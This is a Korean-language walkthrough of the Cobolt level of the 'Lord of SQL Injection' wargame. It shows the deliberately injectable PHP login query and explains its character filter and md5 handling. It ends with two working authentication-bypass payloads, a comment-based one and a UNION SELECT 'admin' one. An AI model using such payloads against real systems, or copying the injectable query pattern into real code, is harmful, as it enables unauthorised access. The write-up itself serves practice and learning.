# Lord of SQL Injection No.1 - Cobolt
## 문제 출제 의도
1. MYSQL에서 원하는 값을 가져 올 수 있는지 확인.
2. PHP에서 GET방식의 입력값을 조작 가능한지 확인.
## 소스 코드
~~~
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
~~~
## 소스 코드 분석
+ md5()
    - 문자열의 md5 해시를 계산한다.
    - md5 함수는 다음과 같은 형식을 취한다.
    ~~~
    string md5 ( string $str [, bool $raw_output ] )
    ~~~
    - $raw_output
        * 값이 TRUE이면, 해시를 길이 16의 바이너리 형식으로 반환한다.
        * 기본값은 FALSE이다.
    - 16진수 32 문자로 해시를 반환한다.
    - md5 함수에 대해 잘 모르겠다면 다음 사이트를 참고하자.  
    <a href="http://php.net/manual/kr/function.md5.php">PHP: md5 - Manual</a>
## 분석 결론
+ 금지 문자, 문자열
    - GET방식으로 입력받은 id값에 prob _ . () 중 하나라도 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
    - GET방식으로 입력받은 pw값에 prob _ . () 중 하나라도 있다면 "No Hack ~_~ "이 출력되고 문제 풀이에 실패한다.
+ pw값은 입력받은 뒤에 md5함수에 의해 암호화 된다.
+ 풀이 성공 조건
    - 데이터베이스에서 받은 값이 'admin' 이면 문제 해결에 성공한다.
## 문제 해결
1. WHERE 조건절 조작
    - id값을 '(single quote)를 이용하여 조작 가능하다.
    - 다음과 유사한 방법들로 WHERE 조건절을 조작 할 수 있다.
    ~~~
    ?id=admin' -- -
    ~~~
    - id가 'admin'인 레코드의 데이터를 불러온다.
2. UNION
    - 다음과 유사한 방법으로 빈 테이블에 추가 값을 가지고 올 수 있다.
    ~~~
    ?id=' UNION(SELECT 'admin') -- -
    ~~~